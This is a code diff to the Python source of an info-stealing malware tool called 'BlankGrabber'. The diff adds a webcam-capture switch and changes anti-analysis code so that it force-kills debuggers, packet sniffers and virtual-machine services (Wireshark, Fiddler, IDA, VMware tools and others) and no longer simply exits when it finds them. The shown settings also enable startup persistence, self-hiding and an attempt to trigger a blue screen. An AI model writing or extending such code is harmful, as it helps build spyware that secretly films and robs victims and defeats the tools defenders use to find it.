@@ -35,6 +35,7 @@ BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force
 STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
 HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
 MESSAGE_BOX = _config.get("MSGBOX", dict()) # Message Box
+CAPTURE_WEBCAM = True
 
 def catch(func):
     def newfunc(*args, **kwargs):
@@ -94,7 +95,7 @@ def force_decode(b: bytes):
     try:
         return b.decode(json.detect_encoding(b))
     except UnicodeDecodeError:
-        return None
+        return b.decode(errors= "backslashreplace")
 
 def is_admin():
     s = subprocess.run("net session", shell= True, capture_output= True).returncode
@@ -127,9 +128,7 @@ class vmprotect:
         tasks = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout)
         for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray"]:
             if banned_task in tasks.lower():
-                kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
-                if kill.returncode:
-                    os._exit(0)
+                subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
         
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
@@ -235,6 +234,8 @@ class BlankGrabber:
 
     @catch
     def webshot(self):
+        if not CAPTURE_WEBCAM:
+            return
         def is_monochrome(path):
             return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
 
